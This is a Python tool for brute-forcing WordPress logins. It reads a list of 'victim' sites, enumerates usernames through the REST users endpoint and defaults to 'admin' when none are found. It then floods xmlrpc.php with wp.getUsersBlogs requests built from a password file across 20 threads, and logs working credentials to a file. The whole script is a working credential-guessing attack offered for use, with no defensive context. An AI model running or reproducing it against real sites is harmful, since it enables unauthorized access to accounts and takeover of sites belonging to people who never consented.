import requests,argparse,sys,json,time
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def fetching_user(url):
	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
		try:
			print
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print
		
	except Exception as e:
		print

	return user_list
def check_array(arr): 
    if len(arr) == 0: 
        return 0
    else: 
        return 1

def local_time():
	t = time.localtime()
	current_time = time.strftime("%H:%M:%S", t)
	return current_time
def save(format):
	s = open("sonuc1.txt", "a+")
	s.write(format+"\n")

def exploit(url, user_url, list_password):
	try:
		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)

		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
		if "isAdmin" in str(r.content):
			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
		else:
			print
	except requests.exceptions.ConnectionError as e:
		print
	except Exception as e:
			print

def brute_url(url):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(colored('[{}][+] try With default username [admin]'.format(local_time()), "green"))
			user.append("admin")

		password = "p2.txt"

		with ThreadPoolExecutor(max_workers=20) as executor:
			for user_url in user:
				with open(password, "r") as password_list:
					for list_password in password_list:
						executor.submit(exploit,url,user_url,list_password)


			user.clear()
	except requests.exceptions.ConnectionError as e:
		print
	except Exception as e:
		print

def main():
 	try:
 		parser = argparse.ArgumentParser(description='Multiple Brute Force XMLRPC [Wordpress]')
 		parser.add_argument("--list", help="List website victim", required=True)
 		args = parser.parse_args()
 		try:
 			with open(args.list, "r") as victim:
 				print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
 				for sites in victim:
 					url = sites.rstrip()
 					brute_url(url)
 				print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
 		except IOError as e:
 			print("[{}][!] List website victim not exist !".format(local_time()))
 			sys.exit()
 	except KeyboardInterrupt as e:
 		print("[{}][!] Exit Program".format(local_time()))
 		sys.exit()

if __name__ == "__main__":
	banner = """Hayirli isler..."""
	print(banner)
	main()
